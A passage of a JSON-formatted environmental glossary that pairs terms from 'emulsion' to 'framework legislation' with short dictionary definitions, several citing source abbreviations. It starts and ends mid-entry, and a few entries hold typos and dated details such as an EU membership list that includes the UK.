\"emulsion\": [\"A stable dispersion of one liquid in a second immiscible liquid, such as milk (oil dispersed in water).\"], \"endocrine system\": [\"The chemical coordinating system in animals, that is, the endocrine glands that produce hormones.\"], \"endocrinology\": [\"The study of the endocrine glands and the hormones that they synthesize and secrete.\\\\n(Source: MGH)\"], \"energy\": [\"The capacity to do work; involving thermal energy (heat), radiant energy (light), kinetic energy (motion) or chemical energy; measured in joules.\", \"A source of power, such as fuel and electrical energy, used for driving machines, providing light and heat, and powering electric devices.\"], \"energy balance\": [\"The energetic state of a system at any given time.\"], \"energy conservation\": [\"The reduction of energy consumption through efficient energy use.\"], \"energy consumption\": [\"Amount of energy consumed by a person or an apparatus.\"], \"energy conversion\": [\"The process of changing energy from one form to another.\"], \"energy demand\": [\"Amount of energy needed by a person or an apparatus.\"], \"energy economics\": [\"The production, distribution, and consumption of usable power such as fossil fuel, electricity, or solar radiation.\\\\n(Source: RHW)\"], \"energy management\": [\"The administration or handling of power derived from sources such as fossil fuel, electricity and solar radiation.\"], \"energy market\": [\"The trade or traffic of energy sources treated as a commodity (such as fossil fuel, electricity, or solar radiation).\\\\n(Source: RHW)\"], \"energy policy\": [\"A statement of a country's intentions in the energy sector.\"], \"energy production\": [\"Generation of energy in a coal fired power station, in an oil fired power station, in a nuclear power station, etc.\"], \"energy recovery\": [\"A form of resource recovery in which the organic fraction of waste is converted to some form of usable energy. Recovery may be achieved through the combustion of processed or raw refuse to produce steam through the pyrolysis of refuse to produce oil or gas; and through the anaerobic digestion of organic wastes to produce methane gas.\\\\n(Source: LANDY)\"], \"energy resource\": [\"Potential supplies of energy which have not yet been used (such as coal lying in the ground, solar heat, wind power, geothermal power, etc.).\\\\n(Source: PHC)\"], \"energy saving\": [\"A set of strategies for avoiding wasting energy.\"], \"energy source\": [\"Potential supplies of energy including fossil and nuclear fuels as well as solar, water, wind, tidal and geothermal power.\\\\n(Source: PHC)\"], \"energy technology\": [\"Technology used to produce energy.\"], \"enforcement\": [\"The execution, carrying out or putting into effect an order, regulation, law or official decree.\"], \"enriched uranium\": [\"Uranium whose concentration of uranium-235, which is able to sustain a nuclear chain reaction, is increased by removing uranium-238.\\\\n(Source: ALL)\"], \"enrichment\": [\"The process of increasing the abundance of a specified isotope in a mixture of isotopes. It is usually applied to an increase in the proportion of U-235, or the addition of Pu-239 to natural uranium for use in a nuclear reactor or weapon.\"], \"environmental auditing\": [\"An assessment of the nature and extent of any harm or detriment, or any possible harm or detriment, that may be inflicted on any aspect of the environment by any activity process, development programme, or any product, chemical, or waste substance. Audits may be designed to: verify or otherwise comply with environmental requirements; evaluate the effectiveness of existing environmental management systems; assess risks generally; or assist in planning for future improvements in environment protection and pollution control\\\\n(Source: GILP96)\"], \"environmental awareness\": [\"The growth and development of awareness, understanding and consciousness toward the biophysical environment and its problems, including human interactions and effects.\"], \"environmental chemistry\": [\"Science dealing with the physical, chemical and biochemical processes that polluting substances undergo when introduced in the environment.\"], \"environmental cost\": [\"Expenses incurred as a result of some violation of ecological integrity either by an enterprise that implements a program to rectify the situation, or by society or the ecosystem as a whole when no person or enterprise is held liable.\"], \"environmental crime\": [\"An unlawful act against the environment, such as water contamination, hazardous waste disposal, air contamination, unpermitted installation of plants, oil spills, etc.\\\\n(Source: AZENPa)\", \"An unlawful act against the environment, such as water contamination, hazardous waste disposal, air contamination, unpermitted installation of plants, oil spills, etc.\"], \"environmental criminal law\": [\"The aggregate of statutory enactments pertaining to actions or instances of ecological negligence deemed injurious to public welfare or government interests and legally prohibited.\"], \"environmental damage\": [\"Harm done to the environment, e.g. loss of wetlands, pollution of rivers, etc.\"], \"environmental economics\": [\"A subfield of economics concerned with environmental issues.\"], \"environmental education\": [\"The educational process that deals with the human interrelationships with the environment and that utilizes an interdisciplinary problem-solving approach with value clarification. Concerned with education progress of knowledge, understanding, attitudes, skills, and commitment for environmental problems and considerations. The need for environmental education is continuous, because each new generation needs to learn conservation for itself.\\\\n(Source: UNUN)\"], \"environmental ethics\": [\"An ecological conscience or moral that reflects a commitment and responsibility toward the environment, including plants and animals as well as present and future generations of people. Oriented toward human societies living in harmony with the natural world on which they depend for survival and well being.\\\\n(Source: UNUN)\"], \"environmental history\": [\"A systematic and chronological account of past events and conditions relating to the ecosystem, its natural resources or, more generally, the external factors surrounding and affecting human life.\\\\n(Source: TOE)\"], \"environmental impact\": [\"Any alteration of environmental conditions or creation of a new set of environmental conditions, adverse or beneficial, caused or induced by the action or set of actions under consideration.\"], \"environmental indicator\": [\"A measurement, statistic or value that provides a proximate gauge or evidence of the effects of environmental management programs or of the state or condition of the environment.\"], \"environmental informatics\": [\"Science and techniques of data elaboration and of computer processing of information concerning ecosystems and ecology.\"], \"environmental investment\": [\"Securities held for the production of income in the form of interest and dividends with the aim of benefitting the environment.\\\\n(Source: ISEP /  EFP)\"], \"environmental legislation\": [\"Branch of law relating to pollution control; national parks, wildlife, fauna and flora, wilderness and biodiversity; environmental and occupational health; environmental planning; heritage conservation and a large number of international conventions relating to the environment.\\\\n(Source: GILP96)\"], \"environmental legislation on agriculture\": [\"A binding rule or body of rules prescribed by a government to regulate any aspect of farm and livestock production that poses a threat to ecological integrity and human health, especially the use of pesticides, fertilizers and land.\"], \"environmental liability\": [\"The penalty to be paid by an organization for the damage caused by pollution and restoration necessary as a result of that damage, whether by accidental spillages from tankers, industrial waste discharges into waterways or land, or deliberate or accidental release of radioactive materials.\"], \"environmentally unfriendly firm\": [\"Firm that dores not comply with environmental regulations for the disposal of noxious wastes generated during the production cycle.\"], \"environmental medicine\": [\"The art and science of the protection of good health, the promotion of aesthetic values, the prevention of disease and injury through the control of positive environmental factors, and the reduction of potential physical, biological, chemical, and radiological hazards.\"], \"environmental policy\": [\"Official statements of principles, intentions, values, and objective which are based on legislation and the governing authority of a state and which serve as a guide for the operations of governmental and private activities in environmental affairs.\"], \"environmental pollution\": [\"The introduction by man into the environment of substances or energy liable to cause hazards to human health, harm to living resources and ecological systems, damage to structure or amenity, or interference with legitimate uses of the environment.\\\\n(Source: GRAHAW)\"], \"environmental protection\": [\"Measures and controls to prevent damage and degradation of the environment, including the sustainability of its living resources.\"], \"environmental protection cost\": [\"The amount of money incurred in the preservation, defense, or shelter of natural resources.\\\\n(Source: EFP / OED)\"], \"environmental psychology\": [\"A branch of experimental psychology which studies the relationships between behavior and the environmental context in which it occurs.\"], \"environmental quality\": [\"Properties and characteristics of the environment, either generalized or local, as they impinge on human beings and other organisms. Environmental quality is a general term which can refer to: varied characteristics such as air and water purity or pollution, noise, access to open space, and the visual effects of buildings, and the potential effects which such characteristics may have on physical and mental health.\\\\n(Source: LANDY)\"], \"environmental report\": [\"An account or statement, usually in writing, describing in detail events, situations or conditions pertaining to the ecosystem, its natural resources or any of the external factors surrounding and affecting human life.\\\\n(Source: TOE)\"], \"environmental research\": [\"The study of the environment and its modifications caused by human activities.\"], \"environmental risk assessment\": [\"Qualitative and quantitative evaluation of the risk posed to the environment by the actual or potential presence and/or use of specific pollutants.\\\\n(Source: OPPTIN)\"], \"environmental science\": [\"The interdisciplinary study of environmental problems, within the framework of established physical and biological principles, i.e. oriented toward a scientific approach.\"], \"environmental security\": [\"Measures taken or policies instituted to protect and promote the safety of external conditions affecting the life, development and survival of an organism.\\\\n(Source: TOE)\"], \"environmental specimen bank\": [\"Places in which selected specimens (fish, mussels, milk, soil sample and human tissue, etc.) are stored without being allowed to decompose.\"], \"environmental subsidy\": [\"Payment by a government to assist or improve performance regarding ecological maintenance or the protection, defense, or shelter of natural resources.\\\\n(Source: ODE)\"], \"environmental terminology\": [\"The vocabulary of technical terms and usage appropriate to community, corporate, governmental and other groups concerned with protecting natural resources, preserving the integrity of the ecosystem and safeguarding human health.\\\\n(Source: ISEP /  TOE)\"], \"environmental vandalism\": [\"The egregious or blatant destruction of delicate ecosystems, especially in violation of environmental protection laws.\"], \"environmental warfare\": [\"The direct manipulation or destruction of ecological resources as either a political threat or for actual military advantage.\"], \"environment\": [\"The set of all natural systems, including the air, land, water, and living things other than humans.\", \"The set of all natural and human-made surroundings that affect individuals, social groupings, and other life.\", \"The complex of physical, chemical, and biotic factors that surround and act upon a specific organism or upon a specific group of organisms.\"], \"enzyme\": [\"Any of a group of catalytic proteins that are produced by living cells and that mediate and promote the chemical processes of life without themselves being altered or destroyed.\"], \"epidemic\": [\"A sudden increase in the incidence rate of a disease to a value above normal, affecting large numbers of people and spread over a wide area.\", \"Spreading rapidly and extensively by infection and affecting many individuals in an area or a population at the same time.\"], \"epidemiology\": [\"The study of the occurrence and distribution of disease and injury specified by person, place, and time.\"], \"equine\": [\"An animal belonging to the family of Equidae.\"], \"equipment\": [\"Any collection of materials, supplies, instrumentality or apparatuses stored, furnished or provided for an undertaking, service or activity.\"], \"equivalent dose\": [\"A quantity used in radiation protection, expressing all radiation on a common scale for calculating the effective absorbed dose.\"], \"ergonomics\": [\"The study of human capability and psychology in relation to the working environment and the equipment operated by the worker.\"], \"erosion\": [\"The general process or the group of processes whereby the materials of Earth's crust are loosened, dissolved, or worn away and simultaneously moved from one place to another, by natural agencies, which include weathering, solution, corrosion, and transportation, but usually exclude mass wasting.\\\\n(Source: BJGEO)\"], \"erosion control\": [\"Practices used during construction or other land disturbing activities to reduce or prevent soil erosion.\"], \"estuarine biology\": [\"The scientific study of the characteristic life processes of living organisms found in a semi-enclosed coastal body of water which has a free connection with the open sea and within which sea water is measurably diluted with freshwater.\\\\n(Source: WOR / MHE / APD)\"], \"estuarine oceanography\": [\"The study of the physical, chemical, biological and geological characteristics of a semi-enclosed coastal body of water which has a free connection with the open sea and within which sea water is measurably diluted with fresh water.\\\\n(Source: MHE / APD)\"], \"estuary\": [\"A river mouth or stream mouth is a part of a river where it flows into the sea, river, lake, reservoir or ocean.\", \"Area at the mouth of a river where it broadens into the sea, and where fresh and sea water intermingle to produce brackish water. The estuarine environment is very rich in wildlife, particularly aquatic, but it is very vulnerable to damage as a result of the actions of humans.\\\\n(Source: WRIGHT)\"], \"etching substance\": [\"Substance capable of wearing away the surface of a metal, glass, etc. by chemical action.\"], \"ether\": [\"A colorless liquid, slightly soluble in water; used as a reagent, intermediate, anesthetic, and solvent.\\\\n(Source: MGH)\", \"A class of chemical compounds which contain an oxygen atom connected to two (substituted) alkyl groups.\"], \"ethics\": [\"The philosophical study of the moral value of human conduct and of the rules and principles that ought to govern it.\"], \"ethnology\": [\"The science that deals with the study of the origin, distribution, and relations of races or ethnic groups of mankind.\"], \"ethology\": [\"The study of animal behaviour in a natural context.\"], \"EU Council\": [\"The Council of the European Union is an institution which exercises legislative and decision-making powers. At the same time, it is the forum in which the representatives of the Governments of the 15 Member States can assert their interests and try to reach compromises. The Council ensures general coordination of the activities of the European Community, the main objective of which is the establishment of an internal market, i.e. an area without internal frontiers guaranteeing four freedoms of movement - for goods, persons, services and capital - to which should soon be added a single currency. In addition, the Council is responsible for intergovernmental cooperation, in common foreign and security policy (CFSP) and in the areas of justice and home affairs (JHA), including for example matters of immigration and asylum, combating terrorism and drugs and judicial cooperation.\\\\n(Source: UEEU)\"], \"Euratom\": [\"A precursor to the European Community, the European Atomic Energy Community was founded in 1958 by the European Common Market to conduct research, develop nuclear energy, create a common market for nuclear fuels and supervise the nuclear industry so as to prevent abuse and protect health.\\\\n(Source: ERD)\"], \"Europe\": [\"The second smallest continent, forming the Western extension of Eurasia: the border with Asia runs from the Urals to the Caspian and the Black Sea.\"], \"European Commission\": [\"The European Union's administrative body, composed of twenty independent members appointed by the Member States for five-year terms and vested with powers of initiative, implementation, management and control according to the mandates established in EU Treaties or handed down by the EU Council.\"], \"European Court of Justice\": [\"The supreme court of The European Union which oversees the application of the\\\\nEU treaties, decides upon the validity and the meaning of Community legislation and determines whether any act or omission by the European Commission, the Council of Minister or any member state constitutes a breach of Community law.\"], \"European Environment Agency\": [\"The EEA is being set up to provide the European Community and its member states with objective, reliable and standardized information on the environment. It will assess the success of existing environmental policies and the data will be used to develop new policies for environmental protection measures. It will gather information covering the present, and foreseeable, state of the environment. The priority area are: air quality and emissions; water quality, pollutants and resources; soil quality, flora and fauna, and biotopes; land use and natural resources; waste management; noise pollution; chemicals; and protection of coastal areas. The Agency will also take into account the socio-economics dimension, cover transboundary and international matters, and avoid the duplication of the activities of other bodies.\\\\n(Source: WRIGHT)\"], \"European Environmental Council\": [\"Council of European Union environment ministers that aims to preserve the quality of the environment, human health, the prudent and rational utilisation of natural resources and to promote measures at international level to deal with regional or worldwide environmental problems.\"], \"European Parliament\": [\"Formerly the \\\"Assembly\\\" of EEC. Comprises some 520 \\\"representatives of the peoples\\\" of European Community states, directly elected, and based in Strasbourg. Exercises advisory and supervisory powers; debates and passes resolutions and may veto admission of new member states.\\\\n(Source: CURZON)\"], \"European Union\": [\"The 27 nations (Austria, Belgium, Bulgaria, Cyprus, Czechia, Denmark, Estiona, Finland, France, Germany, Greece, Hungary, Ireland, Italy, Latvia, Luxembourg, Malta, the Netherlands, Poland, Portugal, Romania, Slovakia, Slovenia, Spain, Sweden and the UK) that have joined together to form an economic community with common monetary, political and social aspirations.\"], \"eutrophication\": [\"A process of pollution that occurs when a lake or stream becomes over-rich in plant nutrient and as a consequence becomes overgrown in algae and other aquatic plants.\"], \"evaluation\": [\"An assessment or a summary of a particular situation.\"], \"evaporation\": [\"Conversion from a liquid or solid state to a vapour.\"], \"evapotranspiration\": [\"Discharge of water from the earth's surface to the atmosphere by evaporation from lakes, streams and soil surfaces and by transpiration from plants.\"], \"evolution\": [\"The biological theory or process whereby species of plants and animals change with the passage of time so that their descendants differ from their ancestors, i.e. development from earlier forms by hereditary transmission of slight variations in successive generations.\", \"A gradual process of development, formation, or growth, especially, one leading to a more advanced or complex form.\"], \"exact science\": [\"Mathematics and other sciences based on calculation.\"], \"excavated hole\": [\"A pit, cavity, or other uncovered cutting produced by excavation.\"], \"executive order\": [\"An order or regulation issued by the president or some administrative authority under his direction for the purpose of interpreting, implementing or giving administrative effect to a provision of the constitution or of some law or treaty.\"], \"exhaust device\": [\"A duct or pipe through which waste material is emitted; a combination of components which provides for enclosed flow of exhaust gas from engine parts to the atmosphere.\\\\n(Source: AMHER /  LEE)\"], \"exhaust gas\": [\"Offgas produced during combustion processes discharged directly or ultimately to the atmosphere.\"], \"exotic species\": [\"Plants, animals or microorganisms which are introduced by humans into areas where they are not native. Exotics are often associated with negative ecological consequences for native species and the ecosystems.\"], \"expenditure\": [\"Spending by consumers, investors, or government for goods or services.\"], \"experiment\": [\"A test under controlled conditions that is made to demonstrate a known truth, examine the validity of a hypothesis, or determine the efficacy of something previously untried.\", \"To conduct an experiment or investigation.\", \"To try something new, as in order to gain experience.\"], \"expert system\": [\"A computer configuration of hardware and software that simulates the judgment and behavior of a human or an organization with extensive knowledge in a particular field, often by giving answers, solutions or diagnoses.\\\\n(Source: RHW / WIC)\"], \"exploration\": [\"A careful systematic search.\"], \"explosion\": [\"A violent, sudden release of energy resulting from powders or gases undergoing instantaneous ignition or from some other means of detonation, often accompanied by a force producing great amounts of heat, major structural damages, shock waves and flying shrapnel.\\\\n(Source: HMD)\"], \"explosive\": [\"A substance, such as trinitrotoluene, or a mixture, such as gunpowder, that is characterized by chemical stability but may be made to undergo rapid chemical change without an outside source of oxygen, whereupon it produces a large quantity of energy generally accompanied by the evolution of hot gases.\", \"With the capability to, or likely to, explode.\", \"Liable to lead to sudden change or violence.\"], \"export\": [\"To send, take or carry an article of trade or commerce out of the country.\", \"Any good or commodity, transported from one country to another country in a legitimate fashion, typically for use in trade.\"], \"exposure\": [\"The time for which a material is illuminated or irradiated.\"], \"expropriation\": [\"The act of depriving an owner of private property for public use.\"], \"extensive cattle farming\": [\"Farming system practiced in very large farms, characterized by low levels of inputs per unit area of land; in such situations the stocking rate, the number of livestock units per area, is low.\"], \"externality\": [\"Discrepancies between private costs and social costs or private advantages and social advantages; the basic concept of externality is interdependence without compensation.\"], \"extraction\": [\"Any process by which a pure metal is obtained from its ore.\\\\n(Source: UVAROV)\"], \"extractive industry\": [\"Primary activities involved in the extraction of non-renewable resources.\\\\n(Source: GOOD)\"], \"fabric\": [\"Any cloth made from yarn or fibres by weaving, knitting, felting, etc.\"], \"factor market\": [\"A market where services of the factors of production (not the actual factors of production) are bought and sold.\"], \"fallout\": [\"The descent of airborne solid or liquid particles to the ground, which occurs when the speed at which they fall due to gravity exceeds that of any upward motion of the air surrounding them.\"], \"fallow area\": [\"Land area normally used for crop production but left unsown for one or more growing seasons.\"], \"fallow land\": [\"Arable land not under rotation that is set at rest for a period of time ranging from one to five years before it is cultivated again, or land usually under permanent crops, meadows or pastures, which is not being used for that purpose for a period of at least one year. Arable land which is normally used for the cultivation of temporary crops but which is temporarily used for grazing is included.\"], \"family\": [\"A group comprising parents, offsprings and others closely related or associated with them.\", \"A group of persons sharing a home or living space, who aggregate and share their incomes, as evidenced by the fact that they regularly take meals together.\", \"A biological taxon, a group of animals or plants, part of an order and consisting of one or more genera.\", \"Of or related to a family.\"], \"family planning\": [\"The control of the number of children in a family and of the intervals between them, especially by the use of contraceptives.\"], \"famine\": [\"A severe shortage of food, as through crop failure or over population. It may be due to poor harvests following drought, floods, earthquake, war, social conflict, etc.\"], \"farm animal\": [\"Animals reared in farms for working and producing food such as meat, eggs and milk.\"], \"farm\": [\"Any tract of land or building used for agricultural purposes, such as for raising crops and livestock.\"], \"fauna\": [\"The entire animal life of a given region, habitat or geological stratum.\"], \"federal government\": [\"A system in which a country or nation formed by a union or confederation of independent states is governed by a central authority or organization.\"], \"federal law\": [\"A binding rule or body of rules established by a government that has been constituted as a union of independent political units or states.\"], \"fee\": [\"A charge fixed by law for services of public officers or for use of a privilege under control of government.\"], \"fen\": [\"Waterlogged, spongy ground containing alkaline decaying vegetation, characterized by reeds, that may develop into peat. It sometimes occurs in the sinkholes of karst region.\"], \"fermentation\": [\"Any enzymatic transformation of organic substrates, especially carbohydrates, generally accompanied by the evolution of gas.\"], \"fern\": [\"Any of a large number of vascular plants composing the division Polypodiophyta, without flowers and fruits.\\\\n(Source: MGH)\"], \"fibre\": [\"The portion of plant products that moves through the human digestive system without being digested.\"], \"field\": [\"A limited area of land with grass or crops growing on it, which is usually surrounded by fences or closely planted bushes when it is part of a farm.\", \"A particular environment or walk of life.\", \"A single aspect of each member of an entity in a database.\", \"A land area free of woodland or human settlements.\", \"The open country near or belonging to a city.\", \"A region affected by a particular force.\", \"An area that can be seen at a given time.\", \"A place where a battle is fought.\", \"A realm of practical, direct, or natural operation, contrasting with an office, classroom, or laboratory.\", \"A number system w\\u0131th functions that has the same properties relative to the operations of addition and multiplication used for real numbers.\", \"A region containing a particular mineral.\", \"The background of the shield.\", \"An area of memory or storage reserved for a particular value.\", \"A component of a database record in which a single unit of information is stored.\", \"A physical or virtual location for the input of information in the form of characters.\", \"To intercept or catch (a ball) and play it.\", \"To be the team catching and throwing the ball, as opposed to hitting it.\", \"To place a team in (a game).\"], \"field damage\": [\"A decline in the productivity of an area of land or in its ability to support natural ecosystems or types of agriculture.\"], \"field experiment\": [\"Experiment carried out on a substance or on an organism in the open air as opposed to in a laboratory.\"], \"field study\": [\"Scientific study made in the open air to collect information that can not be obtained in a laboratory.\"], \"filling material\": [\"Any substance used to fill the holes and irregularities in planed or sanded surfaces so as to decrease the porosity of the surface for finish coatings.\"], \"filling station\": [\"A place where petrol and other supplies for motorists are sold.\", \"A facility selling fuel for road motor vehicles.\"], \"film\": [\"A sequence of animated images.\", \"A thin covering layer, often about something temporarily deposited on the surface.\", \"To capture a motion picture onto film.\", \"To become covered by a thin layer.\", \"A thin flexible strip of cellulose coated with a photographic emission, used in cameras to make negatives and transparencies, capture motion pictures, etc.\"], \"filter\": [\"A porous material for separating suspended particulate matter from liquids by passing the liquid through the pores in the filter and sieving out the solids.\\\\n(Source: MGH)\", \"Any item, mechanism, device or procedure that acts to separate or isolate.\", \"To separate or isolate components from one another with the help of a filter.\"], \"filter cake\": [\"Accumulated solids, wet or dry, generated by any filtration process, including accumulation on fabric filters in air filtering processes, or accumulation of wet solids in liquid filtering processes.\\\\n(Source: EED /  ISEP)\"], \"filtration\": [\"Separation of suspended particles from a liquid, gas, etc., by the action of a filter.\", \"The act of filtering.\"], \"financial compensation\": [\"The financial reparations that a claimant seeks or a court awards for injuries sustained or property harmed by another.\\\\n(Source: IVW)\"], \"financial market\": [\"A place or institution in which buyers and sellers meet and trade monetary assets, including stocks, bonds, securities and money.\"], \"financing\": [\"Procurement of monetary resources or credit to operate a business or acquire assets.\"], \"fine\": [\"A pecuniary punishment or penalty imposed by lawful tribunal upon person convicted of crime or misdemeanor.\"], \"fine dust\": [\"Air-borne solid particles, originating from human activity and natural sources, such as wind-blown soil and fires, that eventually settle through the force of gravity, and can cause injury to human and other animal respiratory systems through excessive inhalation.\"], \"fire\": [\"The state of combustion in which inflammable material burns, producing heat, flames and often smoke.\", \"An unwanted and uncontrolled burning of matter.\", \"Intense adverse criticism.\", \"To terminate the employment of one or more employees.\", \"Uncontrolled burning, conflagration.\"], \"fire precaution\": [\"Measure, action or installation implemented in advance to avert the possibility of any unexpected and potentially harmful combustion of materials.\\\\n(Source: RHW)\"], \"fire protection\": [\"All necessary precautions to see that fire is not initiated, by ensuring that all necessary fire fighting apparatus is in good order and available for use if fire should break out, and by ensuring that personnel are properly trained and drilled in fighting fire.\"], \"fire safety requirement\": [\"Rules to be followed and safety systems to be adopted for preventing or fighting fire.\\\\n(Source: RRDA)\"], \"fire service\": [\"Organisation with trained personnel for dealing with fires and other incidents and for co-operating in their prevention.\"], \"firing\": [\"The process of applying fire or heat, as in the hardening or glazing of ceramics.\\\\n(Source: HARRIS)\"], \"firm\": [\"A commercial association of two or more persons, especially when incorporated.\", \"Resistant to pressure.\", \"A place where an activity is accomplished, whether actual, as a pub, or virtual, as a website.\", \"Fixed; closely compressed.\", \"Marked by firm determination or resolution; not shakable.\", \"Strong and sure (e.g. grasp).\"], \"fish disease\": [\"An illness affecting fish, including bacterial, viral and fungal infections, parasites and maltnutrition.\"], \"fishery\": [\"The industry of catching, processing and selling fish.\"], \"fish\": [\"A cold-blooded vertebrate animal that lives in water that moves with the help of fins and breathes using gills (Pisces).\", \"To catch or try to catch fish.\", \"A new inmate in a prison.\"], \"fish farming\": [\"Raising of fish in inland waters, estuaries or coastal waters.\"], \"fishing\": [\"The art or sport of catching fish with a rod and line and a baited hook or other lure, such as a fly.\", \"The attempt to catch fish or other aquatic animal with a hook or with nets, traps, etc.\"], \"fishing industry\": [\"Industry for the handling, processing, and packing of fish or shellfish for market or shipment.\"], \"fishing vessel\": [\"Ship or boat that is used to catch fish on seas, lakes or rivers.\"], \"fish stock\": [\"The population of fish in a certain area.\"], \"flag of convenience\": [\"Practice of registering a merchant vessel with a country that has favourable (i.e. less restrictive ) safety requirements, registration fees, etc.\"], \"flaring\": [\"1) Flares use open flames during normal and/or emergency operations to combust hazardous gaseous. The system has no special features to control temperature or time of combustion; however, supplemental fuel may be required to sustain the combustion. Historically, flares have been used to dispose of waste gases in the oil and gas industry and at wastewater treatment plants having anaerobic digestors. Regulation for thermal destruction of hazardous wastes limit the practical use of flaring to combustion of relatively simple hydrocarbons, such as methane from digesters or landfill gas collection systems. \\\\n2) A control device that burns hazardous materials to prevent their release into the environment; may operate continuously or intermittently, usually on top a stack.\\\\n(Source: CORBIT /  EPAGLO)\"], \"rapid test\": [\"Medical test whose results are available very quickly.\"], \"flea\": [\"Any of the wingless insects composing the order Siphonaptera; most are ectoparasites of mammals and birds.\\\\n(Source: MGH)\"], \"flocculant\": [\"A reagent added to a dispersion of solids in a liquid to bring together the fine particles to form flocs.\"], \"flocculation\": [\"A process of contact and adhesion whereby the particles of a dispersed substance form large clusters or the aggregation of particles in a colloid to form small lumps, which then settle out.\"], \"flood\": [\"An overflowing; an inundation or flood, especially when the water is charged with much suspended material.\\\\n(Source: BJGEO)\", \"An unusual accumulation of water above the ground caused by high tide, heavy rain, melting snow or rapid runoff from paved areas.\", \"To cover with large amounts of water.\"], \"flooding\": [\"A general and temporary condition of partial or complete inundation of normally dry land areas from the overflow of inland and/or tidal waters, and/or the unusual and rapid accumulation or runoff of surface waters from any source.\"], \"flora restoration\": [\"The process of returning plant ecosystems and habitats to their original conditions.\"], \"flotation\": [\"A process used to separate particulate solids by causing one group of particles to float; utilizes differences in surface chemical properties of the particles, some of which are entirely wetted by water, others are not.\"], \"flow\": [\"The flowing of a fluid.\", \"To move as a fluid from one position to another (e.g. of people).\", \"To move along, of liquids.\"], \"flower\": [\"The reproductive structure of angiosperm plants, consisting of stamens and carpels surrounded by petals and sepals all borne on the receptacle.\", \"A plant that is cultivated or admired for its beautiful blossoms.\", \"(Of a plant) To produce blooms or flowers.\"], \"flowering plant\": [\"The division of seed plants that includes all the flowering plants, characterized by the possession of flowers. The ovules, which become seeds after fertilization, are enclosed in ovaries. The xylem contains true vessels. The angiospermae are divided into two subclasses: Monocotyledoneae and Dycotiledoneae.\\\\n(Source: ALL)\", \"Member of the angiosperm, the class of seed plants that includes all the flowering plants.\"], \"flow field\": [\"The velocity and the density of a fluid as functions of position and time.\"], \"flowing water\": [\"Moving waters like rivers and streams.\"], \"flue gas\": [\"The gaseous combustion product generated by a furnace and often exhausted through a chimney (flue).\"], \"fluidised bed\": [\"A bed of finely divided solid through which air or a gas is blown in a controlled manner so that it behaves as a liquid.\"], \"fluoridation\": [\"The addition of the fluorine ion to municipal water supplies in a final concentration of 0.8-1.6 ppm (parts per million) to help prevent dental caries in children.\"], \"fluorine\": [\"A gaseous chemical element with symbol F and atomic number 9; a member of the halide family, it is the most electronegative element and the most chemically energetic of the nonmetallic elements; highly toxic and corrosive; used in rocket fuels and as a chemical intermediate.\\\\n(Source: MGH)\"], \"river transport\": [\"Transportation of goods or persons by means of ships travelling on rivers.\"], \"fly ash\": [\"Finely divided particles of ash that are entrained in flue gases resulting from the combustion of fuel or other material.\"], \"foaming agent\": [\"A substance which makes it possible to form a homogenous dispersion of a gaseous phase in a liquid or solid medium.\"], \"fodder\": [\"Bulk feed for livestock, especially hay, straw, etc.\\\\n(Source: CED)\"], \"fog\": [\"Water droplets or, rarely, ice crystals suspended in the air in sufficient concentration to reduce visibility appreciably.\", \"To hide from view.\"], \"mist\": [\"Fine water droplets suspended in the air, which reduce visibility. Usually mists form at night, when the temperature falls because the sky is clear. If visibility falls below 1,000 metres, the mist becomes a fog.\"], \"foliage\": [\"The leaves of a plant together.\"], \"food\": [\"A substance that can be ingested and utilized by the organism as a source of nutrition and energy.\"], \"food additive\": [\"Substances that have no nutritive value in themselves (or are not being used as nutrients) which are added to food during processing to improve colour, texture, flavour, or keeping qualities.\"], \"food chain\": [\"A sequence of organisms on successive trophic levels within a community, through which energy is transferred by feeding; energy enters the food chain during fixation by primary producers (mainly green plants) and passes to the herbivores (primary consumers) and then to the carnivores (secondary and tertiary consumers).\"], \"food hygiene\": [\"That part of the science of hygiene that deals with the principles and methods of sanitation applied to the quality of foodstuffs, to their processing, preparation, conservation and consumption by man.\"], \"food industry\": [\"The commercial production and packaging of foods that are fabricated by processing, by combining various ingredients, or both.\"], \"food irradiation\": [\"The process of applying high energy to food products, to sterilize them and extend their shelf-life by killing microorganisms, insects and other pests residing on it.\"], \"food preservation\": [\"Processing designed to protect food from spoilage caused by microbes, enzymes, and autooxidation.\"], \"food quality\": [\"The quality characteristics of food that is acceptable to consumers.\"], \"food science\": [\"The applied science which deals with the chemical, biochemical, physical, physiochemical, and biological properties of foods.\"], \"foodstuff\": [\"A substance that can be used or prepared for use as food.\"], \"food technology\": [\"The application of science and engineering to the refining, manufacturing, and handling of foods; many food technologists are food scientists rather than engineers.\"], \"footpath\": [\"A narrow path for walkers only.\"], \"forage contamination\": [\"Introduction of hazardous or poisonous substances such as arsenic or lead into, or onto, fodder for animals.\"], \"forecast\": [\"An estimate of a future condition.\"], \"foreign policy\": [\"The diplomatic policy of a nation in its interactions with other nations.\"], \"foreign trade\": [\"Trade between countries and firms belonging to different countries.\"], \"forest\": [\"A vegetation community dominated by trees and other woody shrubs, growing close enough together that the tree tops touch or overlap, creating various degrees of shade on the forest floor.\", \"In graph theory, a disjoint union of trees.\"], \"forest damage\": [\"Reduction of tree population in forests caused by acidic precipitation, forest fires, air pollution, deforestation, pests and diseases of trees, wildlife, etc.\"], \"forest ecosystem\": [\"Any forest environment, in which plants and animals interact with the chemical and physical features of the environment, in which they live.\"], \"forest fire\": [\"A conflagration in or destroying large wooded areas having a thick growth of trees and plants.\"], \"forest pest\": [\"Organism that damages trees.\"], \"forest policy\": [\"A course of action adopted and pursued by government or some other organization, which seeks to preserve or protect an extensive area of woodland, often to produce products and benefits such as timber, wildlife habitat, clean water, biodiversity and recreation.\"], \"forest reserve\": [\"Forest area set aside for the purpose of protecting certain fauna and flora, or both.\"], \"forestry\": [\"The management of forest lands for wood, forages, water, wildlife, and recreation.\"], \"forestry practice\": [\"The farming of trees to ensure a continuing supply of timber and other forest products. Foresters care for existing trees, protecting them from fire, pests and diseases, and felling where trees are overcrowded or dying and when ready for cropping. They also plant new areas (afforestation) and replant felled areas (reafforestation).\\\\n(Source: GOOD)\"], \"fossil\": [\"Any remains, trace, or imprint of a plant or animal that has been preserved in the Earth's crust since some past geologic or prehistoric time.\"], \"fossil fuel\": [\"The energy-containing materials which were converted over many thousands of years from their original form of trees, plants and other organisms after being buried in the ground.\"], \"four stroke engine\": [\"An internal combustion engine whose cycle is completed in four piston strokes; includes a suction stroke, compression stroke, expansion stroke, and exhaust stroke.\"], \"framework legislation\": [\"A body of rules prescribed by a government, often composed in a series of inter-related parts, to establish or lay the foundation for a new project, agency or organizational structure.\\\\n(Source: RHW)\"], \"access to information\": [\"The ability, right and permission to approach and use, or the general availability of resources that convey 